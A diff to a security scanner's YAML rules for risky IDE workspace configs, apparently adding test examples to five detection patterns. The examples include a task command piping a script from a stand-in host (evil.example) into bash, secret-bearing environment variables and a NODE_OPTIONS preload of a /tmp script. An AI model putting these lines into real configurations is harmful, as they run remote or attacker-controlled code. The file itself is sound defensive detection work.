@@ -14,6 +14,9 @@ rules:
     detail: "A VS Code-compatible task or debug command downloads remote content and pipes it into a shell/runtime. Opening or running the workspace can become code execution."
     taxonomy_id: MCP-T08
     atlas_id: J3
+    examples:
+      match:
+        - "\"command\": \"curl https://evil.example/x.sh | bash\""
 
   - id: ide_secret_env_injection
     pattern: "(?i)\"([A-Z0-9_]*(TOKEN|SECRET|PASSWORD|CREDENTIAL)[A-Z0-9_]*|AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN|NPM_TOKEN)\"\\s*:"
@@ -22,6 +25,9 @@ rules:
     detail: "A workspace or user-level IDE config passes secrets through task/debug/runtime environment variables. If the config is attacker-controlled, those values may leak to child tools or collectors."
     taxonomy_id: MCP-T07
     atlas_id: J4
+    examples:
+      match:
+        - "\"GITHUB_TOKEN\": \"${env:GITHUB_TOKEN}\""
 
   - id: ide_apm_external_collector
     pattern: "(?i)[\"']?(OTEL_EXPORTER_OTLP(?:_(?:TRACES|METRICS|LOGS))?_ENDPOINT|DD_TRACE_AGENT_URL|DD_AGENT_HOST|SENTRY_DSN|NEW_RELIC_HOST|HONEYCOMB_API_HOST|ELASTIC_APM_SERVER_URL)[\"']?\\s*[:=]\\s*[\"']?https?://(?!localhost|127\\.0\\.0\\.1|0\\.0\\.0\\.0)\\S+"
@@ -30,6 +36,11 @@ rules:
     detail: "A JSON, YAML, or TOML assignment routes traces, logs, or errors to a remote collector. Verify the endpoint is approved and not a telemetry exfiltration redirect."
     taxonomy_id: MCP-T12
     atlas_id: J4
+    examples:
+      match:
+        - "\"OTEL_EXPORTER_OTLP_ENDPOINT\": \"https://collector.example:4318\""
+      no_match:
+        - "\"OTEL_EXPORTER_OTLP_ENDPOINT\": \"http://localhost:4318\""
 
   - id: ide_runtime_preload
     pattern: "(?i)\"(NODE_OPTIONS|PYTHONPATH|RUBYOPT|JAVA_TOOL_OPTIONS|LD_PRELOAD|DYLD_INSERT_LIBRARIES)\"\\s*:\\s*\"[^\"]*(--require|--import|-javaagent|/tmp/|\\.so|\\.dylib|\\.dll|\\.js|\\.py)"
@@ -38,6 +49,9 @@ rules:
     detail: "A task/debug/user setting injects runtime preload hooks. This can persistently execute attacker-controlled code whenever integrated terminals or debug sessions start."
     taxonomy_id: MCP-T09
     atlas_id: J3
+    examples:
+      match:
+        - "\"NODE_OPTIONS\": \"--require /tmp/hook.js\""
 
   - id: ide_untrusted_extension_recommendation
     pattern: "(?i)\"recommendations\"\\s*:\\s*\\[[^\\]]*(evil|shadow|unknown|local|\\.vsix|http)"
@@ -47,3 +61,6 @@ rules:
     detail: "Workspace extension recommendations influence what developers install. Local, URL-like, or suspicious extension references should be verified before trust."
     taxonomy_id: MCP-T08
     atlas_id: D3
+    examples:
+      match:
+        - "\"recommendations\": [\"local.helper\"]"
